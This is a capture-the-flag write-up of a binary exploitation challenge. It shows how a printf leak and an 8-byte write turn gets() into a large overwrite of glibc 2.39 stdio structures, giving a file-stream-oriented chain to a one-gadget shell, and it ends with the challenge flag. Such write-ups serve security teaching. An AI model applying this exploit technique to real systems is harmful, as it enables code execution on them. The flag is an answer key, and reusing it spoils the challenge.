# BSS BOF Writeup

## Challenge

The binary is very small:

```c
// gcc -Wl,-z,now,-z,relro main.c -o bss-bof
#include <stdio.h>
#include <stdint.h>

char buf[8];
int main() {
  uint64_t* dest = 0;
  printf("printf: %p\n", printf);

  read(0, &dest, 8);
  read(0, dest, 8);

  gets(buf);
}

__attribute__((constructor)) void setup() {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
}
```

The obvious reading is “classic `gets` overflow on a BSS buffer”, but that is not the interesting part of the challenge.

## Initial observations

The binary has all the usual protections:

- PIE
- Full RELRO
- NX
- stack canary
- CET (`SHSTK`, `IBT`)

So the `gets(buf)` call is not directly useful as a normal control-flow overwrite:

- `buf` is in `.bss`, not on the stack
- there is no nearby function pointer in the binary that is easy to target
- Full RELRO blocks GOT overwrites
- PIE means the binary base is unknown

What we do have is:

1. A libc leak from `printf("printf: %p\n", printf);`
2. An 8-byte arbitrary write from:

```c
read(0, &dest, 8);
read(0, dest, 8);
```

That is enough for a libc-only exploit.

## Libc base

The challenge image is Ubuntu 24.04, so the shipped libc is glibc 2.39.  
The `printf` leak gives the libc base immediately:

```python
libc_base = printf_addr - 0x60100
```

The important libc offsets used by the exploit are:

- `printf` = `0x60100`
- `_IO_2_1_stdin_` = `0x2038e0`
- `_IO_list_all` = `0x2044c0`
- `_IO_2_1_stderr_` = `0x2044e0`
- `_IO_2_1_stdout_` = `0x2045c0`
- `_IO_wfile_jumps` = `0x202228`
- one-gadget = `0xef52b`

## The real primitive: turn `gets` into a large libc write

The constructor makes `stdin` unbuffered:

```c
setvbuf(stdin, NULL, _IONBF, 0);
```

For glibc stdio this matters a lot. Unbuffered `stdin` uses the internal 1-byte `_shortbuf` inside the `FILE` object.

Right before `gets`, the relevant `stdin` fields look like this:

- `_IO_read_ptr == _IO_read_end`
- `_IO_buf_base == stdin + 0x83`
- `_IO_buf_end == stdin + 0x83`

`stdin + 0x83` is `_IO_2_1_stdin_._shortbuf`.

The first arbitrary write is used to overwrite:

- `stdin->_IO_buf_end` at offset `0x40`

with a much larger address:

```python
new_end = stdin + 0x83 + payload_len
```

So the first 16 bytes we send are:

```python
send(p64(stdin + 0x40))   # destination
send(p64(new_end))        # new _IO_buf_end
```

Then `gets(buf)` runs. Since `_IO_read_ptr == _IO_read_end`, glibc refills `stdin` via the underflow path:

- `_IO_gets`
- `__uflow`
- `_IO_file_underflow`
- `_IO_file_read`

That read uses:

- destination = `stdin->_IO_buf_base`
- length = `stdin->_IO_buf_end - stdin->_IO_buf_base`

Because we enlarged `_IO_buf_end`, glibc performs a large `read()` directly into libc memory starting at `stdin->_shortbuf`.

This is the core trick.

## Why the payload starts with `\\n`

`gets` stops when it sees a newline, but that newline is checked only after glibc has already performed the underflow read into libc memory.

So the big payload starts with:

```python
payload = b"\n" + ...
```

That gives us two nice properties:

1. glibc still reads the whole staged blob into libc
2. `gets` immediately returns after consuming the first byte

At that point, libc’s stdio structures are corrupted and the program simply exits into our FSOP chain.

## Important detail: the read starts inside `stdin` itself

The large read starts at `_shortbuf`, which is at offset `0x83` inside `_IO_2_1_stdin_`.

That means the first bytes of the payload do **not** hit `_IO_list_all` immediately.  
They first overwrite the tail of the live `stdin` object itself:

- `_lock`
- `_offset`
- `_codecvt`
- `_wide_data`
- `_freeres_*`
- `_mode`

If those bytes are left as zeroes, `gets` crashes before the process even reaches exit.

So the payload must preserve the live `stdin` tail first:

```python
wq(0x05, libc_base + STDIN_LOCK_OFF)
wq(0x0D, 0xFFFFFFFFFFFFFFFF)
wq(0x15, 0)
wq(0x1D, libc_base + WIDE_STDIN_OFF)
wq(0x25, 0)
wq(0x2D, 0)
wq(0x35, 0)
wd(0x3D, 0xFFFFFFFF)
```

Those offsets are relative to the beginning of the big read, i.e. relative to `stdin->_shortbuf`.

## From large libc write to code execution

The cleanest target is exit-time stdio cleanup.

On exit, glibc walks `_IO_list_all` and flushes streams via `_IO_flush_all`.

The payload overwrites:

- `_IO_list_all` so it points to `stderr`
- the real `stderr` object so it becomes a fake wide `FILE`
- the real `stdout` object so it becomes fake `_IO_wide_data`
- memory after `stdout` so it becomes a fake codecvt structure

### Fake `FILE` at `stderr`

The fake stream is built on top of `_IO_2_1_stderr_`:

```python
wq(LIST_REL, stderr)
wd(STDERR_REL + 0x00, 0)                 # _flags
wq(STDERR_REL + 0x68, 0)                 # _chain
wq(STDERR_REL + 0x88, lock)              # _lock
wq(STDERR_REL + 0xa0, wide)              # _wide_data -> stdout
wd(STDERR_REL + 0xc0, 1)                 # _mode > 0
wq(STDERR_REL + 0xd8, libc_base + WFILE_JUMPS_OFF)
```

This makes `_IO_flush_all` treat `stderr` as a wide stream and dispatch into `_IO_wfile_overflow`.

### Fake `_IO_wide_data` at `stdout`

The fake wide-data object lives on top of `_IO_2_1_stdout_`:

```python
wq(STDOUT_REL + 0x18, 0)
wq(STDOUT_REL + 0x20, 4)
wq(STDOUT_REL + 0x30, 0)
wq(STDOUT_REL + 0x38, 0)
wq(STDOUT_REL + 0xe0, codecvt)
```

The important part is:

- `write_ptr > write_base`, so glibc believes there is buffered wide output
- the allocation-related pointers are zero, so the code takes the allocation path
- `wide_data + 0xe0` points to our fake codecvt object

### The indirect call

The useful path is:

- `_IO_flush_all`
- `_IO_wfile_overflow`
- `_IO_wdoallocbuf`

Inside `_IO_wdoallocbuf`, glibc performs an indirect call through the fake codecvt structure:

```c
call [fake_codecvt + 0x68]
```

So we fully control RIP.

## One-gadget choice

The exploit uses libc one-gadget:

- `0xef52b`

Its shape is:

```c
execve("/bin/sh", rbp-0x50, [rbp-0x78])
```

The constraints matched the actual state at the indirect call:

- `rbp-0x50` is writable
- `[rbp-0x78] == NULL`
- `rax` points to our fake codecvt object

This gadget accepts either `rax == NULL` or `rax` being a valid `argv[1]` string.  
So the fake codecvt begins with `"-p\x00"`:

```python
payload[STDOUT_REL + 0x120:STDOUT_REL + 0x123] = b"-p\x00"
wq(STDOUT_REL + 0x120 + 0x68, libc_base + ONE_GADGET_OFF)
```

That yields a valid argument vector like:

```c
["/bin/sh", "-p", NULL]
```

and the process spawns a shell during exit processing.

## Exploit flow

Putting it together:

1. Read the leaked `printf` address and compute libc base.
2. Use the 8-byte arbitrary write to set `stdin->_IO_buf_end` to `stdin->_shortbuf + payload_len`.
3. Send a large payload beginning with `\n`.
4. `gets` triggers an underflow read that copies the payload into libc starting at `stdin->_shortbuf`.
5. The early part of the payload preserves the live tail of `stdin`.
6. The rest overwrites `_IO_list_all`, `stderr`, `stdout`, and the fake codecvt object.
7. `gets` returns immediately because the first byte was newline.
8. The process exits, `_IO_flush_all` walks our fake stream, and glibc reaches the controlled indirect call.
9. The one-gadget executes `execve("/bin/sh", ...)`.

## Script

The final exploit is in [solve.py](solve.py).

Local test:

```bash
python3 solve.py CMD='echo READY; /bin/echo WORKED; exit'
```

Remote:

```bash
python3 solve.py REMOTE=1
```

## Flag

```text
tkbctf{b0kug4_s4k1n1_so1v3r_w0_k4k1o3tan0n1}
```
